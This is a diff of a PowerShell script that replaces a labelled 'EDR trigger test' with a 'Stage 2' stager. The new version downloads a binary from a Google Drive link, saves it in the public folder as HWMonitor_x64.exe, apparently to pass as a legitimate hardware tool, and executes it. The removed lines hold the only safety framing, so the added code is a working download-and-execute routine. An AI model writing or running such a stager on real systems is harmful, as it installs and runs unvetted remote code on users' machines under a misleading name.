@@ -1,23 +1,25 @@
-# Simulated Malicious Activity - EDR Trigger Test
-# Safe to run in an isolated testing environment
+# === Stage 2: Download and execute binary from Google Drive ===
 
-# Define URL of a benign file (you can replace this with your own hosted file)
-$Url = "https://drive.google.com/uc?export=download&id=1LRfAV0d645MM4hOQHThWy_BvDz-MpJqU"
+# Replace with your actual file ID from Google Drive
+$FileId = "1LRfAV0d645MM4hOQHThWy_BvDz-MpJqU"
+$DownloadUrl = "https://drive.google.com/uc?export=download&id=$FileId"
+$DestinationPath = "$env:PUBLIC\HWMonitor_x64.exe"
 
-# Define world-writable path
-$Destination = "$env:PUBLIC\testpayload.exe"
-
-# Download the file using Invoke-WebRequest (commonly abused method)
+# Download the binary
 try {
-    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing
-    Write-Host "File downloaded to $Destination"
-} catch {
-    Write-Host "Download failed: $_"
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestinationPath -UseBasicParsing
+    Write-Host "[+] Downloaded HWMonitor_x64.exe to $DestinationPath"
+}
+catch {
+    Write-Host "[-] Failed to download the binary: $_"
+    exit
 }
 
-# Simulate execution (will just open the file in notepad if it's a text file)
+# Execute the binary
 try {
-    Start-Process -FilePath $Destination
-    Write-Host "Simulated execution: $Destination"
-} catch {
-    Write-Host "Execution failed: $_"
+    Start-Process -FilePath $DestinationPath
+    Write-Host "[*] Executed binary: $DestinationPath"
+}
+catch {
+    Write-Host "[-] Failed to execute binary: $_"
+}
